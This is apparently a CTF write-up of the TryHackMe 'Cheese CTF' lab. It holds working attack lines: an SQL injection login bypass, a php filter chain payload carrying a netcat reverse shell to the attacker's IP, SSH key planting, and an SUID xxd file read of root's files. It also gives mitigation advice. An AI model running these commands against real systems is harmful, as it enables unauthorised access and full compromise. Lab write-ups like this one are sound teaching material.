---
title: "TryHackMe - Cheese CTF"
author: Nasrallah
description: ""
date: 2024-10-01 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, lfi, rce, suid]
img_path: /assets/img/tryhackme/cheesectf
image:
    path: cheesectf.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[CheeseCTF](https://tryhackme.com/room/cheesectfv10) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) has a login page on a website vulnerable to SQLi allowing us to bypass the login and access the dashboard. After that we find an LFI which we exploit to get a foothold. Then we paste our private to an authorized_keys file that we can write to and escalate to user `comte`, this user can start/stop a service that gives xxd the suid bit, so we exploit that to read the root flag.

## **Enumeration**

For some reason I wasn't able to get results back from nmap, so I just assumed there is a web server on port 80.

### Web

![page](1.png)

Nothing interesting in this page, but there is a link to a login.

![login](2.png)

Tried some default credentials but didn't work, then tried sql injection and managed to login using `' || 1=1; -- -`.

![loggedin](3.png)

We logged in successfully, and we notice that the site uses a get parameter to get an html file.

### LFI

Let's test for Local File.

![lfi](4.png)

The site is vulnerable to lfi.

## **Foothold**

I tried reading some knows interesting file like `id_rsa` and `access.log` but they weren't there.

Going back to the other links, I noticed that they use a php wrapper.

![phpwrapper](5.png)

This was a hint for us to use wrappers to get access.

Going to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers) we can see how we can get command execution with that.

![payloads](6.png)

First we need to download the python generator script here <https://github.com/synacktiv/php_filter_chain_generator>

Now we run the script to generate a wrapper that sends us a reverse shell:

```bash
python phpgen.py --chain "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.4.213 9001 >/tmp/f'); ?>" > payload.txt
```

>Don't forget to change the IP address in the script to yours

We need to copy the second line and put in the parameter.

![sendpayload](7.png)

Now we setup a listener and send the request.

```terminal
┌─[]─[10.9.4.213]─[sirius@parrot]─[~/ctf/thm/cheesy]
└──╼ [★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.9.4.213] from (UNKNOWN) [10.10.70.67] 50320
bash: cannot set terminal process group (829): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cheesectf:/var/www/html$ 
```

## **Privilege Escalation**

Let's run linpeas now.

![linpeas](8.png)

We see that we have write permissions over `authorized_keys` of user `comte` and also over `exploit.timer` service.

Let's escalate our privileges to user `comte` by adding our ssh public key to the authorized_keys.

First we create a pair of keys on our machine using the following command.

```terminal
┌─[]─[10.9.4.213]─[sirius@parrot]─[~/ctf/thm/cheesy]
└──╼ [★]$ ssh-keygen -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:ztjnuG852Kxx1ksjUG8KjIXQND3SHKEqQgH/6erl1M8 sirius@parrot
The key's randomart image is:
+---[RSA 3072]----+
|o.  .oo+oo       |
| ..  .o+=        |
| ..   o....      |
|.  . o + . .     |
|. . + . S   o    |
| . o . = o +     |
|    + o =+*.+    |
|   =   o.B*o o   |
| .o .   E=o..    |
+----[SHA256]-----+
```

Now we copy the `id_rsa.pub` to the authorized_keys

![pubkey](9.png)

Now we use the private key to ssh as `comte`.

```terminal
┌─[]─[10.9.4.213]─[sirius@parrot]─[~/ctf/thm/cheesy]                                           
└──╼ [★]$ ssh -i id_rsa comte@10.10.70.67         

 * Documentation:  https://help.ubuntu.com                                                               
 * Management:     https://landscape.canonical.com                                                       
 * Support:        https://ubuntu.com/advantage                                                          
                                                                                                         
  System information as of Fri 27 Sep 2024 10:58:57 PM UTC                                               

  System load:  0.08               Processes:             144                                            
  Usage of /:   31.1% of 18.53GB   Users logged in:       0                                              
  Memory usage: 9%                 IPv4 address for ens5: 10.10.70.67                                    
  Swap usage:   0%                                  


 * Introducing Expanded Security Maintenance for Applications.                                           
   Receive updates to over 25,000 software packages with your                                            
   Ubuntu Pro subscription. Free for personal use.                                                       

     https://ubuntu.com/pro                         

Expanded Security Maintenance for Applications is not enabled.                                           

comte@cheesectf:~$                                  
comte@cheesectf:~$ id
uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)
```

Let's check our privileges.

```terminal
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

We can start the `exploit.timer` service we saw earlier.

```terminal
comte@cheesectf:/etc/systemd/system$ sudo /bin/systemctl start exploit.timer
Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
See system logs and 'systemctl status exploit.timer' for details.
```

Trying to start it gives us an error, let's check the file.

```terminal
comte@cheesectf:/etc/systemd/system$ cat exploit.timer 
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

Pasting this to chatgpt tells us that the error is at `OnBootSec` which doesn't have any value.

It also tells us that there should be another file that should be called `exploit.service` that runs after we start `exploit.timer`.

```terminal
comte@cheesectf:/etc/systemd/system$ ls -l exploit.*
-rw-r--r-- 1 root root 141 Mar 29 15:36 exploit.service
-rwxrwxrwx 1 root root  87 Mar 29 16:25 exploit.timer
```

We indeed found the service file.

```terminal
comte@cheesectf:/etc/systemd/system$ cat exploit.service 
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

This service creates a copy of `xxd` in opt and gives it suid and execute permission.

Let's edit the `exploit.timer` file and add `1s` as a value for `OnBootSec`.

And now we start the service:

```bash
sudo /bin/systemctl start exploit.timer
```

If we check the /opt directory we find the binary

```terminal
comte@cheesectf:/etc/systemd/system$ ls /opt -l
total 20
-rwsr-sr-x 1 root root 18712 Sep 27 23:11 xxd
```

Going to [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/#suid) we can find how to exploit suid xxd.

![xxd](10.png)

We can read the root.txt file with the following command;

```terminal
comte@cheesectf:/etc/systemd/system$ /opt/xxd /root/root.txt | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{REDACTED}

```

## **Beyond root**

In my attempt to get a shell, I printed the `.bash_history` of root wishing I would find a password there, but I found the command `git clone https://github.com/drk1wi/portspoof.git`.

Going to the repository I find that this tool shows all the ports as open and emulate a service, which explains the long time nmap takes to scan the target, and when i used a fast scan it indeed showd every port as open which made me think there was sth wrong in my end.

## **Prevention and Mitigation**

### SQL injection

The login page is vulnerable to sqli allowing us the bypass the authentication and access sensitive data and functionalities

You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".

### Local File Inclusion

We were able to find an lfi vulnerability on`secret-script.php`. The program uses the include function; `include($file);` without any security measures allowing us to read files from the system and execute system commands.

Completely avoid passing filenames in user input. If the application requires the use filenames from user input and there is no way around it, create a whitelist of safe files.

Validate the user input before processing it by verifying that the input contains only permitted content, such as alphanumeric characters only.

### Broken Access Control

We had write permission over sensitive files which allowed us to escalate privileges

Apply the principle of Least Privilege, where the users are given the minimum levels of access or permissions needed to perform their job.

Sensitive files like `authorized_keys` should only be writable by the owner.

### SUID

Some binaries like `xxd` becomes dangerous after given the suid permission which allows hackers to elevate privileges to root and have control over the whole system.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers>

<https://github.com/synacktiv/php_filter_chain_generator>

<https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection>

<https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack>

<https://gtfobins.github.io/gtfobins/xxd/#suid>
